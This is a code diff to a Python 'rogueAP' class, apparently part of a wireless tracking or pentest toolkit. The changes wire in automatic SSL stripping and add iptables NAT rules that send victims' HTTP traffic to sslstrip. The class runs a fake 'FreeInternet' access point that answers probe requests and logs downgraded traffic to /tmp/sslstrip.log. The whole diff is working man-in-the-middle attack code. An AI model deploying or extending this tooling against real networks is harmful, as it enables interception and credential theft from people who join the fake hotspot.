@@ -24,7 +24,7 @@ class rogueAP:
     def __init__(self, **kwargs):
 
         self.ssid = kwargs.get("ssid", "FreeInternet")
-        self.wlan_iface = kwargs.get("wlan_iface", None)    # If none, will use first wlan capable of injection
+        self.wlan_iface = kwargs.get("wlan_iface", "mon0")    # If none, will use first wlan capable of injection
         self.net_iface = kwargs.get("net_iface", "eth0")    # iface with outbound internet access
         self.enable_mon = kwargs.get("enable_mon", False)   # airmon-ng start <wlan_iface> 
         self.promisc =   kwargs.get("promisc", False)       # Answer all probe requests
@@ -100,6 +100,9 @@ dhcp-leasefile=/etc/dhcpd.leases
         # SSL Strip
         self.launch_sslstrip = "sslstrip_snoopy -w /tmp/sslstrip.log -f"
         self.fo_ssl = open("/tmp/sslstrip.log", "r")
+
+        if self.do_sslstrip:
+            self.run_sslstrip()
 
     def run_ap(self):
         run_program("killall airbase-ng")
@@ -196,10 +199,10 @@ dhcp-leasefile=/etc/dhcpd.leases
         else:
             return []
 
-    def do_nat(self,sslstrip=False):
+    def do_nat(self):
         # Handle NAT
         ipt = ['iptables -F', 'iptables -F -t nat', 'iptables -t nat -A POSTROUTING -o %s -j MASQUERADE'%self.net_iface,  'iptables -A FORWARD -i at0 -o %s -j ACCEPT'%self.net_iface]
-        if sslstrip:
+        if self.do_sslstrip:
             ipt.insert(2, 'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
         for rule in ipt:
             run_program(rule)
